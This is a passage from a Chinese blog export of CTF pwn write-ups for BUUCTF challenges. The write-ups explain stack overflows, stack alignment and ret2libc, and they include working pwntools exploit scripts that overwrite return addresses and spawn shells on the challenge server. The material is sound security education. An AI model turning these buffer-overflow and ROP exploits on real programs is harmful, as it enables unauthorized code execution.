#利用LibcSearcher模块找到匹配的libc版本<br>base=puts_addr-libc.dump(&#x27;puts&#x27;)     #获取基址<br>bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)  #获取binsh地址<br>system=base+libc.dump(&#x27;system&#x27;)      #获取system函数地址<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;) #选择选项1、encrypt<br>#binsh字符串起始地址压入edi，作为system函数的参数，然后调用system函数<br>payload=junk+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>当时在kali上做的时候，本机一直跑不通，远程成功了，两次找到的puts地址也不相同，后来问了大佬才知道是libcsearcher找不到kali上的libc版本，导致失败了。做pwn题最好还是在ubuntu上，毕竟远程环境大多是ubuntu，所以打算转回ubuntu了。</p><h2 id="ret2dl_resolve"><a class="markdownIt-Anchor" href="#ret2dl_resolve"></a> ret2dl_resolve</h2><h2 id="ret2vdso"><a class="markdownIt-Anchor" href="#ret2vdso"></a> ret2VDSO</h2><h2 id="栈扩展"><a class="markdownIt-Anchor" href="#栈扩展"></a> 栈扩展</h2><h2 id="栈迁移"><a class="markdownIt-Anchor" href="#栈迁移"></a> 栈迁移</h2><h2 id="leak-pie"><a class="markdownIt-Anchor" href="#leak-pie"></a> leak pie</h2><h2 id="leak-canary"><a class="markdownIt-Anchor" href="#leak-canary"></a> leak canary</h2><h2 id="rop"><a class="markdownIt-Anchor" href="#rop"></a> ROP</h2><h2 id="srop"><a class="markdownIt-Anchor" href="#srop"></a> SROP</h2><h2 id="brop"><a class="markdownIt-Anchor" href="#brop"></a> BROP</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-pwn刷题记录</title>
    <link href="/posts/ed20bbdc/"/>
    <url>/posts/ed20bbdc/</url>
    
    <content type="html"><![CDATA[<h1 id="buuctf-pwn"><a class="markdownIt-Anchor" href="#buuctf-pwn"></a> BUUCTF-pwn</h1><h2 id="test_your_nc"><a class="markdownIt-Anchor" href="#test_your_nc"></a> test_your_nc</h2><p>连接靶机后输入ls，看到下面有一个flag，cat一下就可以得到flag了</p><p><img src="/posts/ed20bbdc/Untitled.png" alt="Untitled"></p><h2 id="rip"><a class="markdownIt-Anchor" href="#rip"></a> rip</h2><p>首先看一下文件信息，很干净，没有什么保护措施</p><p><img src="/posts/ed20bbdc/Untitled%201.png" alt="Untitled"></p><p>再看一下其反汇编代码，可以看到它使用了gets函数，而这个函数正是很容易发生栈溢出的</p><p><img src="/posts/ed20bbdc/Untitled%202.png" alt="Untitled"></p><p>而且我们在代码里发现了fun函数，这个函数就是用来执行system shell的</p><p><img src="/posts/ed20bbdc/Untitled%203.png" alt="Untitled"></p><p>找到其入口点为0x401186</p><p><img src="/posts/ed20bbdc/Untitled%204.png" alt="Untitled"></p><p>从汇编中可以看到，s的大小为15，所以我们只要用15个字节来填充这个S，再用8个字节来填充rbp即可，最后再把fun函数的入口点覆盖到ebp上方的返回地址处就可以了</p><p><img src="/posts/ed20bbdc/Untitled%205.png" alt="Untitled"></p><p>下面就是构造的exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br><span class="hljs-comment"># io=remote(host,port)</span><br>io=process(<span class="hljs-string">&#x27;/home/kali/buuctf/pwn1&#x27;</span>)<br><br>fun=<span class="hljs-number">0x401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(fun)<br><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># sleep(10)</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>可以看到本地执行的很好，成功运行了shell</p><p><img src="/posts/ed20bbdc/Untitled%206.png" alt="Untitled"></p><p>但是到远程去跑的时候却遇到了问题，如图，也无法显示flag</p><p><img src="/posts/ed20bbdc/Untitled%207.png" alt="Untitled"></p><p>看了别的wp才知道是遇到了system栈不对齐的问题</p><p><strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，也就是地址需要以0结尾（0x10,0x20等等）</strong></p><p>具体可参考下面这篇博客</p><p><a href="http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html">在一些64位的glibc的payload调用system函数失败问题 (eonew.cn)</a></p><p>因为题主的本机是kali，所以在本机调试的时候并没有遇到问题，但是到远程就不行了</p><p>可以看一下函数执行时的栈帧，此时rbp地址末尾是30，那么显然返回地址的末尾是38，这就没有和0x10对齐了，所以导致程序被crash了</p><p><img src="/posts/ed20bbdc/Untitled%208.png" alt="Untitled"></p><h3 id="system函数栈未对齐解决方法"><a class="markdownIt-Anchor" href="#system函数栈未对齐解决方法"></a> system函数栈未对齐解决方法</h3><p>有两个方法</p><p><strong>方法一：</strong></p><p>将system入口地址+1</p><p><img src="/posts/ed20bbdc/Untitled%209.png" alt="Untitled"></p><p>如图，我们原来使用的是401186，如果+1就会跳过一条栈操作指令，而push一个栈指令正好是8个字节，所以这样的操作可以使得原本不对齐（比如0x18）的栈对齐0x10</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/pwn1&#x27;)</span><br><br>fun=<span class="hljs-number">0x0000000000401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(fun+<span class="hljs-number">1</span>)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>成功得到flag</p><p><img src="/posts/ed20bbdc/Untitled%2010.png" alt="Untitled"></p><p><strong>方法2：</strong></p><p>在进入system函数前多ret一次</p><p>我们可以在构造payload时在system入口地址前多构造一个ret指令的地址，使其多ret一次，相当于栈被多放一个8个字节的指令，那自然就可以对齐了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/pwn1&#x27;)</span><br><br>fun=<span class="hljs-number">0x0000000000401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(ret)+p64(fun)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>而且显然如果把payload改成payload=junk+p64(ret)+p64(ret)+p64(ret)+p64(fun)这样，也是可以成功的。因为一个ret是对齐的话，那三个ret自然也是对齐的。感兴趣的可以验证下。</p><p><img src="/posts/ed20bbdc/Untitled%2011.png" alt="Untitled"></p><h2 id="warmup_csaw_2016"><a class="markdownIt-Anchor" href="#warmup_csaw_2016"></a> warmup_csaw_2016</h2><p>查看文件信息，无保护措施</p><p><img src="/posts/ed20bbdc/Untitled%2012.png" alt="Untitled"></p><p>在ida查看其反汇编代码</p><p><img src="/posts/ed20bbdc/Untitled%2013.png" alt="Untitled"></p><p>可以发现gets函数可以造成栈溢出</p><p>同时还可以发现下面的这个函数很有意思，执行的话应该可以直接打印出flag</p><p><img src="/posts/ed20bbdc/Untitled%2014.png" alt="Untitled"></p><p>所以下面的思路就是构造输入，使得栈溢出后执行40060D处的函数</p><p>看一下get中v5的大小，发现其在rbp下方0x40处</p><p><img src="/posts/ed20bbdc/Untitled%2015.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2016.png" alt="Untitled"></p><p>所以可以构造如下的exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29939</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/warmup_csaw_2016&#x27;)</span><br><br>fun=<span class="hljs-number">0x000000000040060d</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(fun)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>执行后可以看到成功打印出了flag，这次没有考虑栈对齐也成功了</p><p><img src="/posts/ed20bbdc/Untitled%2017.png" alt="Untitled"></p><h2 id="ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#ciscn_2019_n_1"></a> ciscn_2019_n_1</h2><p>查看文件信息</p><p><img src="/posts/ed20bbdc/Untitled%2018.png" alt="Untitled"></p><p>开启了NX，表示构造的shellcode不可执行。但是因为没有开启canary，所以栈溢出本身还是可以利用的。</p><p>看一下反汇编代码</p><p><img src="/posts/ed20bbdc/Untitled%2019.png" alt="Untitled"></p><p>这个思路很清晰，因为我们输入的是v1,但是判断的v2，所以没有办法进入我们想要的那个if分支</p><p>但是如果我们可以利用v1的栈溢出将v2的值给修改了，那就可以成功执行目标代码了</p><p>在ida里把鼠标悬停在这两个变量上，可以看到，v1的偏移的rbp-0x30，v2的偏移是rbp-0x4。</p><p>所以我们只要把v1开始的前0x2C个随意填充，然后将后面的四个字节填充成11.28125的十六进制就可以了</p><p><img src="/posts/ed20bbdc/Untitled%2020.png" alt="Untitled"></p><p>在ida里看下func函数中if语句的汇编代码，双击那个变量就可以其16进制的值，这也就是11.28125的16进制了。</p><p><img src="/posts/ed20bbdc/Untitled%2021.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2022.png" alt="Untitled"></p><p>构造如下的exp，就可以得到flag了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">28583</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>)<br>v2=<span class="hljs-number">0x41348000</span><br>payload=junk+p64(v2)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>下面的exp没有考虑v2，直接利用返回地址将函数控制流转移到了system(cat flag)，也是可以成功的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">25589</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x38</span>)<br>getflag=<span class="hljs-number">0x4006BE</span><br>payload=junk+p64(getflag)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#pwn1_sctf_2016"></a> pwn1_sctf_2016</h2><p>文件信息如下，还是不能构造shellcode，可以利用栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2023.png" alt="Untitled"></p><p>ida看代码，可以看到这个get_flag函数，这个函数的利用地址为0x8048F0D</p><p><img src="/posts/ed20bbdc/Untitled%2024.png" alt="Untitled"></p><p>看下vuln函数可以发现确实是栈溢出，但是fgets一共读入了32个字符到s,但是我们可以看到，s共有0x3C，需要填充那么多字节才可以溢出到返回地址</p><p><img src="/posts/ed20bbdc/Untitled%2025.png" alt="Untitled"></p><p>但是看到其中有个replace函数，是用来将I替换成you的（看了别的wp才明白），这样就可以实现字节扩充，我们输入20个I就可以扩充到60个字节，从而填满0x3C的缓冲区。</p><p>relplace函数功能验证：</p><p><img src="/posts/ed20bbdc/Untitled%2026.png" alt="Untitled"></p><p>成功的exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># create by Zino</span><br><span class="hljs-comment"># 221005</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">26106</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br><br>junk=<span class="hljs-string">b&#x27;I&#x27;</span>*(<span class="hljs-number">20</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>getflag=<span class="hljs-number">0x8048F0D</span><br>payload=junk+p64(getflag)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="jarvisoj_level0"><a class="markdownIt-Anchor" href="#jarvisoj_level0"></a> <strong>jarvisoj_level0</strong></h2><p>这题比较简单，看一下文件，没什么特别的，然后找到shell函数，再看里面还有一个read函数，那就可以直接准备溢出了。</p><p><img src="/posts/ed20bbdc/Untitled%2027.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2028.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2029.png" alt="Untitled"></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221006</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">28103</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)<br>getflag=<span class="hljs-number">0x400596</span><br>payload=junk+p64(getflag)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="第五空间2019-决赛pwn5"><a class="markdownIt-Anchor" href="#第五空间2019-决赛pwn5"></a> [第五空间2019 决赛]PWN5</h2><p>这题有stack canary了</p><p><img src="/posts/ed20bbdc/Untitled%2030.png" alt="Untitled"></p><h2 id="ciscn_2019_c_1ret2libc"><a class="markdownIt-Anchor" href="#ciscn_2019_c_1ret2libc"></a> ciscn_2019_c_1(ret2libc)</h2><p>不可执行栈，无法用shellcode，可以栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2031.png" alt="Untitled"></p><p>看一下main函数，函数整理逻辑就是让你加密字符串</p><p><img src="/posts/ed20bbdc/Untitled%2032.png" alt="Untitled"></p><p>再看一下encrypt函数，可以看到其中的gets函数存在栈溢出，可以利用它完成攻击</p><p><img src="/posts/ed20bbdc/Untitled%2033.png" alt="Untitled"></p><p>但是找遍文件，发现找不到system函数和“/bin/sh”。所以这题不能返回到题目所给的攻击函数中。需要使用ret2libc。</p><blockquote><p><strong>ret2libc</strong></p><p>这种攻击方式主要针对的动态链接编译的程序，当我们无法在程序中找到system()、execve()这种系统级函数时基于可以利用libc.so中的这些函数</p><p>libc.so是linux下C语言库中的运行库的动态链接版，其中包含了大量可以利用的函数，包括system()、execve()等系统级函数，如果我们可以找到这些函数在内存中的位置，我们就可以用其覆盖掉返回地址，来获得当前进制的控制权。</p><p>libc.so库有很多版本，但是对于一个特定的版本而言，其各个函数的相对于文件开始的偏移都是已知的，所以我们只要知道当前库在内存中的地址以及目标函数system相对于当前库的偏移，我们就可以获得这个函数在当前内存中的地址了。</p><p>而要获得libc在内存中的基址，我们就需要有一个获得一个已经在程序中执行过的libc中的函数在内存中的地址，在这题里puts函数就是一个我们可以利用函数，我们可以泄露出这个函数在的内存地址</p><p>只要得到了这个，我们就可以通过LibcSearcher库来找到这个函数对应的libc库版本，也就可以获得libc库中这个函数的偏移了，用内存中该函数的地址减去libc库中该函数的偏移，就可以得到libc库的基址了。</p><p>然后再计算得到libc库中system函数的偏移即可。</p></blockquote><blockquote><p><strong>plt表和got表</strong></p><p>GOT（Global Offset Table 全局偏移表）是一个存储外部库函数的表</p><p>PLT（Procedure Link Table 程序链接表）则是由代码片段组成的，每个代码片段都跳转到GOT表中的一个具体的函数调用</p><p>当我们调用库函数的时候，都会先跳转到plt表中这个函数的位置，然后再跳转到GOT表中这个函数的具体函数调用地址，即实际内存地址。</p></blockquote><blockquote><p><strong>延迟绑定技术</strong></p><p>在一个程序的运行的过程中，往往不是所有的函数都能用到，相反在大量的符号中，只有少部分会用到，所以如果在程序一开始的时候就把所有的函数都链接好然而最后又没有用到，这很明显是一种浪费。</p><p>但是如果在动态链接中，当一个库函数是第一次在程序中调用的时候，这时候got表中的地址也不是其真实地址，还需要经过一些复杂的间接跳转，才会最终到达这个函数在内存中的真实地址。那如果每次执行库函数都有这样的过程，那就会有很大的性能开销。</p><p>所以出现了延迟绑定技术。</p><p>其具体过程如下</p><p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，但是如果这个函数执行过，那么之后got中就会变成这个函数的实际地址，下次就可以直接调用了</p><p>下面的两个图很清晰的展现了这个过程</p><p>函数第一次被调用过程</p><p><img src="/posts/ed20bbdc/Untitled%2034.png" alt="Untitled"></p><p>函数第二次被调用过程</p><p><img src="/posts/ed20bbdc/Untitled%2035.png" alt="Untitled"></p></blockquote><p>有了这些基础知识，我们就可以开始做这道题了</p><p>首先还是确定返回地址</p><p><img src="/posts/ed20bbdc/Untitled%2036.png" alt="Untitled"></p><p>由此可知缓冲区为0x50+0x8，我们覆盖这些就可以到返回地址了。</p><p>然后我们需要将控制流转移到put函数，同时需要为其准备参数，所以需要pop rdi；ret指令</p><p>可以用ROPgadget 指令</p><p><img src="/posts/ed20bbdc/Untitled%2037.png" alt="Untitled"></p><p>下面是完整的exp</p><p>其中有两次注入payload，第一次是为了泄露puts函数地址，第二次是为了实施ret2libc攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># Create By Zino<br># 221010<br>from pwn import *<br>from LibcSearcher import *<br># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>host=&#x27;node4.buuoj.cn&#x27;<br>port=29417<br>io=remote(host,port)<br># io=process(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br>elf=ELF(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)<br>offset=0x50<br>junk=b&#x27;\0&#x27;+b&#x27;a&#x27;*(offset-1+8)#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址<br>main = elf.symbols[&#x27;main&#x27;]          #获取main函数地址<br>puts_plt=elf.plt[&#x27;puts&#x27;]            #获取puts函数plt表中地址<br>puts_got=elf.got[&#x27;puts&#x27;]            #获取puts函数got表中的地址<br>pop_rdi_ret=0x0000000000400c83      #ROPgadget找到的 pop rdi；ret指令地址<br>ret=0x00000000004006b9              #栈平衡，使其对齐0x10<br><br>#首先填入pop rdi ret指令，这正好会将puts_got地址压入rdi中，作为puts函数的参数，这样就可以打印出这个put的真实地址<br>#然后加上main函数的地址，使得打印完后函数控制流回到main开始的地方，重新开始执行一次以便实施攻击<br>payload=junk+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.recvline()                       #encryp函数在return前还有两行输入，接收掉<br>io.recvline()<br>#获取puts地址，[:-1]过滤掉最后的\n,ljust获取前八字节，不足补\0,u64解包二进制串成int形式<br>puts_addr= u64(io.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\0&#x27;))  <br>#hex将一个int数表示成16进制形式<br>print(hex(puts_addr))<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  #利用LibcSearcher模块找到匹配的libc版本<br>base=puts_addr-libc.dump(&#x27;puts&#x27;)     #获取基址<br>bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)  #获取binsh地址<br>system=base+libc.dump(&#x27;system&#x27;)      #获取system函数地址<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;) #选择选项1、encrypt<br>#binsh字符串起始地址压入edi，作为system函数的参数，然后调用system函数<br>payload=junk+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>在kali上做的时候，本机一直跑不通，远程成功了，两次找到的puts地址也不相同，后来问了大佬才知道是libcsearcher找不到kali上的libc版本，导致失败了。做pwn题最好还是在ubuntu上，毕竟远程环境大多是ubuntu，所以打算转回ubuntu了。</p><h2 id="ciscn_2019_n_8"><a class="markdownIt-Anchor" href="#ciscn_2019_n_8"></a> ciscn_2019_n_8</h2><p>保护全开，canary（栈保护），nx（堆栈不可执行），PIE（地址随机化）</p><p><img src="/posts/ed20bbdc/Untitled%2038.png" alt="Untitled"></p><p>看下代码，发现代码其实比较简单，只要在var13的位置输入17就可以了</p><p><img src="/posts/ed20bbdc/Untitled%2039.png" alt="Untitled"></p><p>将鼠标悬停在var上，我们可以var的大小是DWORD[15]，表示每一个字符数组都占用32位，即四个字节</p><p><img src="/posts/ed20bbdc/Untitled%2040.png" alt="Untitled"></p><p>所以可以构造如下exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221012</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26120</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br><br>payload=<span class="hljs-string">b&#x27;aaaa&#x27;</span>*<span class="hljs-number">13</span>+p32(<span class="hljs-number">17</span>)<br><span class="hljs-built_in">print</span>(payload)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="jarvisoj_level2"><a class="markdownIt-Anchor" href="#jarvisoj_level2"></a> jarvisoj_level2</h2><p>开了不可执行栈，不能构造shellcode，可以栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2041.png" alt="Untitled"></p><p>漏洞函数很简单，可以看到 存在栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2042.png" alt="Untitled"></p><p>shift+F12打开字符串看一下，可以发现存在“/bin/sh”字符串，那么system和binsh就齐全了，引导控制流到sytem(”/bin/sh”)就行了。</p><p><img src="/posts/ed20bbdc/Untitled%2043.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2044.png" alt="Untitled"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By 